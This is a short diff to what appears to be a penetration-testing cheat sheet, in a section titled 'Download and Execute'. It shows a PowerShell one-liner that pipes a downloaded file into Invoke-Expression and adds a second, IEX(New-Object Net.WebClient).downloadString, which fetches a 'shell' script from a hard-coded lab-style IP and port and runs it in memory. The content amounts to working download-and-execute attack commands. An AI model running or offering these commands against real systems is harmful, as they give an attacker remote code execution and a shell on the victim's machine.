@@ -15,3 +15,4 @@ Download and Execute
 
 `iwr "http://<ip>:<port>/<filename>" | iex
 
+`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.241:8080/shell.xyz')`
